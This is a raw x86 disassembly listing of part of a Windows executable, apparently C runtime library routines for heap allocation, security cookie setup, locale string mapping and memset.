  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
